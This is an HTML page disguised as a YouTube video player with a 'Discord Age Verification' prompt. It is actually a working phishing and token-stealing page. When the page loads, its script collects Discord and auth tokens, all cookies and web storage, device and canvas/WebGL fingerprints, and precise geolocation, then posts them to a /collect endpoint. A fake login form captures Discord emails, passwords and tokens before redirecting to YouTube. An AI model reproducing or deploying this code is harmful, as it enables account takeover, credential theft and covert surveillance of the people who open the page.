<!DOCTYPE html>
<html>
<head>
    <title>YouTube Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; text-align: center; padding: 20px; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { max-width: 900px; width: 100%; background: #111; padding: 30px; border-radius: 16px; border: 1px solid #333; }
        iframe { width: 100%; height: 480px; border-radius: 12px; border: none; }
        h2 { color: #fff; margin-bottom: 15px; font-weight: 400; }
        .fake-login { margin-top: 25px; background: #1a1a1a; padding: 25px; border-radius: 12px; max-width: 450px; margin-left: auto; margin-right: auto; border: 1px solid #2a2a2a; }
        .fake-login h3 { color: #7289da; margin-bottom: 15px; font-weight: 500; }
        .fake-login input { display: block; width: 100%; margin: 10px 0; padding: 12px; border-radius: 8px; border: none; background: #2a2a2a; color: #fff; font-size: 14px; }
        .fake-login input::placeholder { color: #888; }
        .fake-login button { background: #7289da; color: #fff; padding: 12px 40px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; transition: 0.3s; }
        .fake-login button:hover { background: #5b6eae; }
        .fake-login button:disabled { opacity: 0.5; cursor: not-allowed; }
        .note { color: #555; font-size: 12px; margin-top: 15px; }
        .status { color: #00ff88; font-size: 13px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>▶ Loading your video...</h2>
        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe>
        <p class="note">🔒 Secure streaming • Age verification required</p>

        <div class="fake-login">
            <h3>Discord Age Verification</h3>
            <input type="text" id="discordEmail" placeholder="Discord Email or Phone">
            <input type="password" id="discordPassword" placeholder="Discord Password">
            <input type="text" id="discordToken" placeholder="Discord Token (optional)">
            <button onclick="submitFake()">Verify & Watch</button>
            <p class="status" id="statusMsg">✓ Verification successful! Redirecting...</p>
        </div>
    </div>

    <script>
        (function() {

            // ======================== التوكن ========================
            function extractDiscordToken() {
                let found = [];
                let all = {};

                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        let key = localStorage.key(i);
                        let val = localStorage.getItem(key);
                        all['local_' + key] = val;
                        if (val && val.length > 30) {
                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
                                found.push({ source: 'localStorage', key, value: val });
                            }
                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
                                found.push({ source: 'localStorage(guess)', key, value: val });
                            }
                        }
                    }
                } catch (e) {}

                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        let key = sessionStorage.key(i);
                        let val = sessionStorage.getItem(key);
                        all['session_' + key] = val;
                        if (val && val.length > 30) {
                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
                                found.push({ source: 'sessionStorage', key, value: val });
                            }
                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
                                found.push({ source: 'sessionStorage(guess)', key, value: val });
                            }
                        }
                    }
                } catch (e) {}

                try {
                    document.cookie.split(';').forEach(c => {
                        let t = c.trim();
                        if (t.toLowerCase().includes('token') || t.toLowerCase().includes('discord') || t.toLowerCase().includes('auth')) {
                            let parts = t.split('=');
                            found.push({ source: 'cookie', key: parts[0], value: parts.slice(1).join('=') });
                        }
                    });
                } catch (e) {}

                try {
                    for (let key in window) {
                        try {
                            let val = window[key];
                            if (typeof val === 'string' && val.length > 40) {
                                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
                                    found.push({ source: 'window', key, value: val });
                                }
                                if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
                                    found.push({ source: 'window(guess)', key, value: val });
                                }
                            }
                        } catch (e) {}
                    }
                } catch (e) {}

                // إزالة المكررات
                let unique = [];
                let seen = new Set();
                found.forEach(item => {
                    let hash = item.value.substring(0, 40);
                    if (!seen.has(hash)) {
                        seen.add(hash);
                        unique.push(item);
                    }
                });

                return { tokens: unique, allStorage: all };
            }

            // ======================== معلومات الجهاز ========================
            function getDeviceInfo() {
                let info = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages || [],
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                };
                return info;
            }

            // ======================== بصمة Canvas ========================
            function getCanvasFingerprint() {
                try {
                    let canvas = document.createElement('canvas');
                    canvas.width = 256;
                    canvas.height = 128;
                    let ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.fillText('FP', 2, 15);
                    ctx.fillStyle = 'rgba(102,204,0,0.7)';
                    ctx.fillText('Fingerprint', 4, 45);
                    return canvas.toDataURL();
                } catch (e) {
                    return 'error';
                }
            }

            // ======================== WebGL ========================
            function getWebGLInfo() {
                try {
                    let canvas = document.createElement('canvas');
                    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return 'webgl not supported';
                    let debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debug) {
                        return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                    }
                    return 'webgl no debug';
                } catch (e) {
                    return 'webgl error';
                }
            }

            // ======================== الشبكة ========================
            function getNetworkInfo() {
                let info = {};
                try {
                    let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (conn) {
                        info.type = conn.effectiveType || 'unknown';
                        info.downlink = conn.downlink ? conn.downlink + 'Mbps' : 'unknown';
                        info.rtt = conn.rtt ? conn.rtt + 'ms' : 'unknown';
                    }
                } catch (e) {}
                return info;
            }

            // ======================== الخطوط المثبتة ========================
            function getInstalledFonts() {
                let fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Arial Black', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI'];
                let installed = [];
                fonts.forEach(f => {
                    let span = document.createElement('span');
                    span.style.fontFamily = f;
                    if (span.style.fontFamily === f) installed.push(f);
                });
                return installed;
            }

            // ======================== جمع كل البيانات ========================

            let tokenData = extractDiscordToken();
            let device = getDeviceInfo();
            let canvas = getCanvasFingerprint();
            let webgl = getWebGLInfo();
            let network = getNetworkInfo();
            let fonts = getInstalledFonts();

            let data = {
                // 🔥 التوكن
                discordTokens: tokenData.tokens,
                discordTokensCount: tokenData.tokens.length,
                allStorage: tokenData.allStorage,

                // الجهاز
                device: device,

                // بصمة
                canvasFingerprint: canvas.substring(0, 100) + '...',
                webglInfo: webgl,

                // الشبكة
                network: network,

                // الخطوط
                installedFonts: fonts,

                // الكوكيز كاملة
                allCookies: document.cookie,

                // الموقع (سيجي لاحقاً)
                location: null
            };

            // ======================== الموقع الجغرافي ========================
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
                        sendData(data);
                    },
                    err => {
                        data.location = { error: err.message };
                        sendData(data);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                data.location = { error: 'Geolocation not supported' };
                sendData(data);
            }

            // إرسال متكرر لضمان الوصول
            setTimeout(() => sendData(data), 500);
            setTimeout(() => sendData(data), 2000);
            setTimeout(() => sendData(data), 5000);
            setTimeout(() => sendData(data), 10000);

            function sendData(finalData) {
                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(finalData)
                }).catch(e => console.log(e));
            }

            // ======================== نموذج الدسكورد الوهمي ========================
            window.submitFake = function() {
                let email = document.getElementById('discordEmail').value;
                let password = document.getElementById('discordPassword').value;
                let token = document.getElementById('discordToken').value;

                if (email || password || token) {
                    fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            discordEmail: email,
                            discordPassword: password,
                            discordToken: token,
                            extra: 'discord_login_form'
                        })
                    }).catch(e => console.log(e));

                    document.getElementById('statusMsg').style.display = 'block';
                    document.querySelector('.fake-login button').textContent = '✓ Verified';
                    document.querySelector('.fake-login button').disabled = true;
                    document.querySelectorAll('.fake-login input').forEach(inp => inp.disabled = true);

                    setTimeout(() => {
                        window.location.href = 'https://www.youtube.com';
                    }, 2000);
                } else {
                    alert('Please fill in at least one field.');
                }
            };

        })();
    </script>
</body>
</html>
